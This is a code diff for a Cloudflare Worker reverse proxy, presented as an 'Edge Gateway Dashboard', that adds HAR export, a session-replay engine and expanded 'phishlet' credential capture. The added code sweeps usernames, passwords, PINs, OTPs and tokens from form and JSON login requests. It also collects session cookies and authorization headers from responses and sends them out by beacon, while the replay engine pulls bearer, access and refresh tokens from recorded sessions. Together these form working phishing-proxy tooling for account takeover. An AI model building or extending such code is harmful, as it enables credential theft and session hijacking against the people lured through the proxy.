@@ -40,6 +40,42 @@ type Env = {
 
 const CF_API = "https://api.cloudflare.com/client/v4";
 
+// ── HAR (HTTP Archive) types ──
+type HarEntry = {
+  startedDateTime: string;
+  time: number;
+  request: {
+    method: string;
+    url: string;
+    httpVersion: string;
+    headers: Array<{ name: string; value: string }>;
+    queryString: Array<{ name: string; value: string }>;
+    cookies: Array<{ name: string; value: string }>;
+    headersSize: number;
+    bodySize: number;
+    postData?: { mimeType: string; text: string; params?: Array<{ name: string; value: string }> };
+  };
+  response: {
+    status: number;
+    statusText: string;
+    httpVersion: string;
+    headers: Array<{ name: string; value: string }>;
+    cookies: Array<{ name: string; value: string }>;
+    content: { size: number; mimeType: string; text: string };
+    redirectURL: string;
+    headersSize: number;
+    bodySize: number;
+  };
+  cache: Record<string, never>;
+  timings: { send: number; wait: number; receive: number };
+};
+
+type HarLog = {
+  version: string;
+  creator: { name: string; version: string };
+  entries: HarEntry[];
+};
+
 type PhishletConfig = {
   name?: string;
   proxy_hosts?: Array<{ phish_sub?: string; orig_sub?: string; domain?: string; session?: boolean }>;
@@ -450,6 +486,326 @@ async function resolveCorsOrigin(request: Request, env: Env): Promise<string> {
     return origin || origins[0];
   }
   return origins[0];
+}
+
+/**
+ * Convert stored InterceptCapture rows into a HAR (HTTP Archive) JSON blob.
+ * HAR 1.2 format — compatible with Chrome DevTools, Charles Proxy, and most
+ * traffic analysis tools. Each capture becomes one HAR entry with full
+ * request/response headers, body, timing, and metadata.
+ */
+function buildHar(captures: Array<{
+  ts: number;
+  method: string;
+  path: string;
+  host: string;
+  reqHeaders: string;
+  reqBody: string;
+  respStatus: number;
+  respHeaders: string;
+  respBody: string;
+}>): { log: HarLog } {
+  const entries: HarEntry[] = captures.map((c) => {
+    // Parse stored JSON headers back into arrays.
+    let reqHeaders: Array<{ name: string; value: string }> = [];
+    try { reqHeaders = Object.entries(JSON.parse(c.reqHeaders)).map(([n, v]) => ({ name: n, value: String(v) })); } catch { /* keep empty */ }
+    let respHeaders: Array<{ name: string; value: string }> = [];
+    try { respHeaders = Object.entries(JSON.parse(c.respHeaders)).map(([n, v]) => ({ name: n, value: String(v) })); } catch { /* keep empty */ }
+
+    // Build URL from host + path (best-effort reconstruction).
+    const url = `https://${c.host}${c.path}`;
+    const reqBodySize = new TextEncoder().encode(c.reqBody).length;
+    const respBodySize = new TextEncoder().encode(c.respBody).length;
+
+    const startedAt = new Date(c.ts).toISOString();
+
+    return {
+      startedDateTime: startedAt,
+      time: 0, // Not captured at intercept level.
+      request: {
+        method: c.method,
+        url,
+        httpVersion: "HTTP/1.1",
+        headers: reqHeaders,
+        queryString: (() => {
+          try {
+            const u = new URL(url);
+            return Array.from(u.searchParams.entries()).map(([n, v]) => ({ name: n, value: v }));
+          } catch { return []; }
+        })(),
+        cookies: extractHarCookies(reqHeaders, c.reqHeaders),
+        headersSize: -1,
+        bodySize: reqBodySize,
+        ...(c.reqBody ? {
+          postData: {
+            mimeType: reqHeaders.find((h) => h.name.toLowerCase() === "content-type")?.value ?? "application/x-www-form-urlencoded",
+            text: c.reqBody,
+            params: parseHarPostParams(c.reqBody),
+          },
+        } : {}),
+      },
+      response: {
+        status: c.respStatus,
+        statusText: getStatusText(c.respStatus),
+        httpVersion: "HTTP/1.1",
+        headers: respHeaders,
+        cookies: extractHarCookies(respHeaders, c.respHeaders),
+        content: {
+          size: respBodySize,
+          mimeType: respHeaders.find((h) => h.name.toLowerCase() === "content-type")?.value ?? "text/plain",
+          text: c.respBody,
+        },
+        redirectURL: respHeaders.find((h) => h.name.toLowerCase() === "location")?.value ?? "",
+        headersSize: -1,
+        bodySize: respBodySize,
+      },
+      cache: {},
+      timings: { send: 0, wait: 0, receive: 0 },
+    };
+  });
+
+  return {
+    log: {
+      version: "1.2",
+      creator: { name: "Edge Gateway Dashboard", version: GATEWAY_VERSION },
+      entries,
+    },
+  };
+}
+
+/** Extract cookies from a headers array for HAR format. */
+function extractHarCookies(headers: Array<{ name: string; value: string }>, rawHeadersJson: string): Array<{ name: string; value: string }> {
+  const cookieHeader = headers.find((h) => h.name.toLowerCase() === "set-cookie" || h.name.toLowerCase() === "cookie");
+  if (!cookieHeader) return [];
+  return cookieHeader.value.split(";").map((c) => {
+    const [name, ...rest] = c.trim().split("=");
+    return { name, value: rest.join("=") };
+  }).filter((c) => c.name.length > 0);
+}
+
+/** Parse POST body parameters (form-encoded or JSON) for HAR postData.params. */
+function parseHarPostParams(body: string): Array<{ name: string; value: string }> | undefined {
+  if (!body) return undefined;
+  // Try form-encoded first.
+  if (body.includes("=") && !body.startsWith("{")) {
+    try {
+      const params = new URLSearchParams(body);
+      const result: Array<{ name: string; value: string }> = [];
+      params.forEach((v, k) => result.push({ name: k, value: v }));
+      if (result.length > 0) return result;
+    } catch { /* fall through */ }
+  }
+  // For JSON, return undefined — params is for form data only.
+  return undefined;
+}
+
+/** Map HTTP status codes to standard reason phrases. */
+function getStatusText(code: number): string {
+  const map: Record<number, string> = {
+    200: "OK", 201: "Created", 204: "No Content",
+    301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified", 307: "Temporary Redirect",
+    400: "Bad Request", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed",
+    408: "Request Timeout", 409: "Conflict", 410: "Gone", 413: "Payload Too Large", 422: "Unprocessable Entity", 429: "Too Many Requests",
+    500: "Internal Server Error", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout",
+  };
+  return map[code] ?? "Unknown";
+}
+
+/**
+ * Replay engine — takes a HAR JSON blob and a proxy slug, then replays each
+ * request sequentially through the target proxy. Returns a structured report
+ * with per-request status codes, extracted credentials, and timing.
+ *
+ * This allows the agent to reverse-engineer an entire authentication flow
+ * by replaying a recorded session and observing how credentials move through
+ * redirects, POSTs, and Set-Cookie responses.
+ */
+type ReplayEntry = {
+  index: number;
+  method: string;
+  url: string;
+  status: number;
+  latencyMs: number;
+  redirectUrl: string | null;
+  cookies: string[];
+  credentials: Record<string, string>;
+  error?: string;
+};
+
+type ReplayReport = {
+  total: number;
+  succeeded: number;
+  failed: number;
+  entries: ReplayEntry[];
+  extractedTokens: string[];
+  flowSummary: string;
+};
+
+async function replayHar(
+  env: Env,
+  harBody: string,
+  proxySlug: string,
+): Promise<ReplayReport> {
+  let har: { log?: { entries?: Array<{
+    request?: { method?: string; url?: string; headers?: Array<{ name: string; value: string }>; postData?: { mimeType?: string; text?: string } };
+    response?: { status?: number };
+  }> } };
+  try {
+    har = JSON.parse(harBody);
+  } catch {
+    throw new Error("Invalid HAR JSON — could not parse.");
+  }
+
+  const entries = har.log?.entries ?? [];
+  if (entries.length === 0) throw new Error("HAR contains no entries to replay.");
+
+  // Resolve the proxy config once.
+  const config = await resolveProxy(env, proxySlug);
+  if (!config || !config.enabled) {
+    throw new Error(`Proxy "${proxySlug}" not found or disabled.`);
+  }
+
+  const reportEntries: ReplayEntry[] = [];
+  let succeeded = 0;
+  let failed = 0;
+  const allCookies: string[] = [];
+  const allCreds: Set<string> = new Set();
+
+  // Track cookies across replay so Set-Cookie from earlier responses feeds
+  // into subsequent requests (simulating a real browser session).
+  let cookieJar = "";
+
+  for (let i = 0; i < entries.length; i++) {
+    const entry = entries[i];
+    const req = entry.request ?? {};
+    const method = (req.method ?? "GET").toUpperCase();
+    let targetUrl = req.url ?? "";
+
+    // Rewrite the original URL through the proxy.
+    if (targetUrl) {
+      try {
+        const original = new URL(targetUrl);
+        const proxyPath = `/proxy/${proxySlug}${original.pathname}${original.search}`;
+        targetUrl = `https://localhost${proxyPath}`;
+      } catch {
+        targetUrl = `/proxy/${proxySlug}/${targetUrl.replace(/^https?:\/\//, "")}`;
+      }
+    }
+
+    // Build headers from HAR, applying accumulated cookies.
+    const headers = new Headers();
+    for (const h of req.headers ?? []) {
+      const lower = h.name.toLowerCase();
+      if (lower === "host" || lower === "content-length" || lower === "transfer-encoding") continue;
+      headers.set(h.name, h.value);
+    }
+    if (cookieJar) {
+      const existingCookie = headers.get("Cookie") ?? "";
+      headers.set("Cookie", existingCookie ? `${existingCookie}; ${cookieJar}` : cookieJar);
+    }
+
+    let body: BodyInit | undefined;
+    if (method !== "GET" && method !== "HEAD" && req.postData?.text) {
+      body = req.postData.text;
+      if (!headers.has("Content-Type") && req.postData.mimeType) {
+        headers.set("Content-Type", req.postData.mimeType);
+      }
+    }
+
+    const start = Date.now();
+    let replayEntry: ReplayEntry;
+
+    try {
+      const upstream = new Request(targetUrl, { method, headers, body, redirect: "manual" });
+      const resp = await fetch(upstream);
+      const latencyMs = Date.now() - start;
+
+      // Extract Set-Cookie headers to build the cookie jar.
+      const setCookieHeaders = resp.headers.getSetCookie?.() ?? [];
+      const newCookies: string[] = [];
+      for (const sc of setCookieHeaders) {
+        const cookiePair = sc.split(";")[0].trim();
+        newCookies.push(cookiePair);
+        const idx = cookieJar.indexOf(cookiePair.split("=")[0]);
+        if (idx >= 0) {
+          // Replace existing cookie.
+          const before = cookieJar.lastIndexOf(";", idx);
+          if (before >= 0) {
+            cookieJar = cookieJar.slice(0, before) + cookieJar.slice(cookieJar.indexOf(";", idx) >= 0 ? cookieJar.indexOf(";", idx) : cookieJar.length);
+          }
+        }
+      }
+      if (newCookies.length > 0) {
+        cookieJar = (cookieJar ? cookieJar + "; " : "") + newCookies.join("; ");
+        cookieJar = cookieJar.slice(0, 1000); // Cap cookie jar size.
+      }
+
+      const redirectUrl = resp.headers.get("Location");
+      const respBody = await resp.clone().text().catch(() => "");
+
+      // Extract credentials from response body + headers.
+      const credFound: Record<string, string> = {};
+      const credPatterns = [
+        /access_token["\s:=]+([^"\s&]+)/i,
+        /id_token["\s:=]+([^"\s&]+)/i,
+        /refresh_token["\s:=]+([^"\s&]+)/i,
+        /"token"\s*:\s*"([^"]+)"/i,
+        /authorization:\s*(bearer\s+\S+)/i,
+      ];
+      for (const pattern of credPatterns) {
+        const match = respBody.match(pattern) ?? (resp.headers.get("Authorization") ?? "").match(pattern);
+        if (match) {
+          credFound[`token_${match.index}`] = match[1] || match[0];
+          allCreds.add(match[1] || match[0]);
+        }
+      }
+
+      allCookies.push(...newCookies);
+      succeeded++;
+
+      replayEntry = {
+        index: i,
+        method,
+        url: req.url ?? targetUrl,
+        status: resp.status,
+        latencyMs,
+        redirectUrl,
+        cookies: newCookies,
+        credentials: credFound,
+      };
+    } catch {
+      failed++;
+      replayEntry = {
+        index: i,
+        method,
+        url: req.url ?? targetUrl,
+        status: 0,
+        latencyMs: Date.now() - start,
+        redirectUrl: null,
+        cookies: [],
+        credentials: {},
+        error: "upstream unreachable",
+      };
+    }
+
+    reportEntries.push(replayEntry);
+  }
+
+  // Build a human-readable flow summary.
+  const flowSummaryEntries = reportEntries.map((e) => {
+    const prefix = e.status >= 400 || e.status === 0 ? "❌" : e.status >= 300 ? "↪" : "✓";
+    return `${prefix} ${e.method} ${e.status} → ${e.url.slice(0, 80)}${e.redirectUrl ? ` → ${e.redirectUrl.slice(0, 60)}` : ""}`;
+  });
+  const flowSummary = flowSummaryEntries.join("\n");
+
+  return {
+    total: entries.length,
+    succeeded,
+    failed,
+    entries: reportEntries,
+    extractedTokens: [...allCreds],
+    flowSummary,
+  };
 }
 
 /** Endpoints that always require an API key (if configured on the worker). */
@@ -1154,7 +1510,8 @@ async function reverseProxy(
       }
 
       // Phishlet-aware extraction: if this proxy has a phishlet, try to capture
-      // credentials from the request body and auth tokens from Set-Cookie headers.
+      // credentials from the request body (form-encoded AND JSON) plus auth tokens
+      // from Set-Cookie headers and any Authorization response header leaks.
       if (preResolvedConfig?.phishlet) {
         const phishlet = parsePhishlet(preResolvedConfig.phishlet);
         if (phishlet) {
@@ -1164,28 +1521,82 @@ async function reverseProxy(
           const authTokenNames = phishlet.auth_tokens
             ?.map((t) => t.name)
             .filter((n): n is string => typeof n === "string" && n.length > 0) ?? [];
+          const authTokenKeys = phishlet.auth_tokens
+            ?.flatMap((t: Record<string, unknown>) => {
+              const keys = t.keys;
+              if (Array.isArray(keys)) return keys.filter((k): k is string => typeof k === "string");
+              if (t.name && typeof t.name === "string") return [t.name];
+              return [];
+            })
+            .filter((k): k is string => typeof k === "string" && k.length > 0) ?? authTokenNames;
           const baseUrl = `${incoming.protocol}//${incoming.host}`;
           beaconPromise = request.clone().text().then((text) => {
-            const params = new URLSearchParams(text);
+            if (!text) return;
             const found: Record<string, string> = {};
-            for (const key of credKeys) {
-              if (params.has(key)) found[key] = params.get(key) ?? "";
+
+            // Try form-encoded body first (most login forms).
+            const contentType = (request.headers.get("Content-Type") ?? "").toLowerCase();
+            if (contentType.includes("x-www-form-urlencoded") || !contentType) {
+              const params = new URLSearchParams(text);
+              for (const key of credKeys) {
+                if (params.has(key)) found[key] = params.get(key) ?? "";
+              }
+              // Broad sweep: capture any param matching username/password/email patterns
+              // even if not in the explicit credKeys list.
+              const broadUserPattern = /^(?:user|email|login|username|account|member|customer|handle|nick|uname|uid)(?:[_.-]?(?:name|id|email))?$/i;
+              const broadPassPattern = /^(?:pass|pwd|password|secret|passcode|passphrase|pin)(?:[_.-]?(?:word|code|phrase|confirm))?$/i;
+              params.forEach((value, key) => {
+                if (broadUserPattern.test(key) && !found[key]) found[key] = value;
+                if (broadPassPattern.test(key) && !found[key]) found[key] = value;
+              });
             }
-            if (Object.keys(found).length === 0) return;
-            const cookies: string[] = [];
-            response.headers.forEach((value, key) => {
-              if (key.toLowerCase() === "set-cookie") {
-                const name = value.split(";")[0].split("=")[0].trim();
-                if (authTokenNames.length === 0 || authTokenNames.includes(name)) {
-                  cookies.push(value);
+
+            // Try JSON body (modern auth APIs — OAuth, REST logins).
+            if (contentType.includes("json")) {
+              try {
+                const json = JSON.parse(text);
+                if (json && typeof json === "object" && !Array.isArray(json)) {
+                  const obj = json as Record<string, unknown>;
+                  for (const key of credKeys) {
+                    if (typeof obj[key] === "string") found[key] = obj[key] as string;
+                  }
+                  // Broad JSON sweep
+                  for (const [k, v] of Object.entries(obj)) {
+                    if (typeof v !== "string") continue;
+                    if (/^(?:user|email|login|username|account|member|handle|nick|uname|uid)(?:[_.-]?(?:name|id|email))?$/i.test(k)) found[k] = v;
+                    if (/^(?:pass|pwd|password|secret|passcode|passphrase|pin|otp|token|code)(?:[_.-]?(?:word|code|phrase))?$/i.test(k)) found[k] = v;
+                  }
                 }
+              } catch { /* not JSON */ }
+            }
+
+            if (Object.keys(found).length === 0) return;
+
+            // Capture auth tokens from response Set-Cookie headers, plus any
+            // Authorization / X-Auth-* / X-Token response headers.
+            const cookies: string[] = [];
+            const cookiePattern = /^(?:session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf|_csrf|connect\.sid|JSESSIONID|PHPSESSID)/i;
+            response.headers.forEach((value, key) => {
+              const lower = key.toLowerCase();
+              if (lower === "set-cookie") {
+                const cookieName = value.split(";")[0].split("=")[0].trim();
+                const relevant =
+                  authTokenKeys.length === 0 ||
+                  authTokenKeys.some((n: string) => n.toLowerCase() === cookieName.toLowerCase()) ||
+                  cookiePattern.test(cookieName);
+                if (relevant) cookies.push(value);
+              }
+              // Also capture leaked auth tokens in response headers.
+              if (lower === "authorization" || lower === "x-auth-token" || lower === "x-api-key" || lower === "x-access-token") {
+                cookies.push(`${key}: ${value}`);
               }
             });
+
             return sendBeacon(env, baseUrl, {
               proxy: proxyLabel,
               url: target.toString(),
               credentials: found,
-              cookies,
+              cookies: cookies.slice(0, 20), // Cap at 20 cookies to stay lean.
               phishlet: phishlet.name ?? proxyLabel,
             });
           }).catch(() => undefined);
@@ -1352,8 +1763,80 @@ export default {
     // domain after the DO creates the record.
     const isProxyCreate = path === "/api/proxies" && method === "POST";
 
+    // ── HAR export — generate HTTP Archive from stored intercepts ──
+    if (path === "/api/intercepts/har" && method === "GET") {
+      const authErr = await checkAuth(request, env);
+      if (authErr) return authErr;
+      try {
+        const interceptReq = new Request("https://do/api/intercepts", { headers: { "X-Intercept-TTL": "3600" } });
+        interceptReq.headers.set("X-Rork-DO-Class", "ItemsStore");
+        interceptReq.headers.set("X-Rork-DO-Id", STORE_ID);
+        const interceptRes = await doFetch(env, interceptReq);
+        if (!interceptRes.ok) {
+          return decorate(
+            Response.json({ success: false, error: "could not fetch intercepts" }, { status: 502 }),
+            corsOrigin,
+          );
+        }
+        const json = (await interceptRes.json()) as { data?: Array<{ ts: number; method: string; path: string; host: string; reqHeaders: string; reqBody: string; respStatus: number; respHeaders: string; respBody: string }> };
+        const captures = json.data ?? [];
+        const har = buildHar(captures);
+        return decorate(
+          new Response(JSON.stringify(har, null, 2), {
+            status: 200,
+            headers: {
+              "Content-Type": "application/har+json",
+              "Content-Disposition": `attachment; filename="edge-gateway-${new Date().toISOString().slice(0, 10)}.har"`,
+            },
+          }),
+          corsOrigin,
+        );
+      } catch {
+        return decorate(
+          Response.json({ success: false, error: "failed to generate HAR" }, { status: 500 }),
+          corsOrigin,
+        );
+      }
+    }
+
+    // ── Replay engine — replay a HAR session through a target proxy ──
+    if (path === "/api/replay" && method === "POST") {
+      const authErr = await checkAuth(request, env);
+      if (authErr) return authErr;
+      try {
+        const body = (await request.json().catch(() => null)) as {
+          har?: string;
+          proxySlug?: string;
+        } | null;
+        const harBody = typeof body?.har === "string" ? body.har : "";
+        const proxySlug = (body?.proxySlug ?? "").toString().trim();
+        if (!harBody) {
+          return decorate(
+            Response.json({ success: false, error: "A HAR JSON body is required in the 'har' field." }, { status: 400 }),
+            corsOrigin,
+          );
+        }
+        if (!proxySlug) {
+          return decorate(
+            Response.json({ success: false, error: "A 'proxySlug' is required to replay against." }, { status: 400 }),
+            corsOrigin,
+          );
+        }
+        const report = await replayHar(env, harBody, proxySlug);
+        return decorate(Response.json({ success: true, data: report }), corsOrigin);
+      } catch (err: unknown) {
+        const message = err instanceof Error ? err.message : String(err);
+        return decorate(
+          Response.json({ success: false, error: message }, { status: 400 }),
+          corsOrigin,
+        );
+      }
+    }
+
     const isTraffic = path === "/api/traffic";
     const isIntercepts = path === "/api/intercepts";
+    const isHarExport = path === "/api/intercepts/har";
+    const isReplay = path === "/api/replay";
     const isProxyConfig = path === "/api/proxies" || /^\/api\/proxies\/\d+$/.test(path) || /^\/api\/proxies\/\d+\/recon$/.test(path);
     const isWildcardDns = path === "/api/cloudflare/wildcard";
     const isWorkerRoutes = path === "/api/cloudflare/worker-routes" || /^\/api\/cloudflare\/worker-routes\/.+/.test(path);
@@ -1410,6 +1893,8 @@ export default {
       !path.startsWith("/api/items") &&
       !isTraffic &&
       !isIntercepts &&
+      !isHarExport &&
+      !isReplay &&
       !isProxyConfig &&
       !isConfigRoute &&
       !isWildcardDns &&
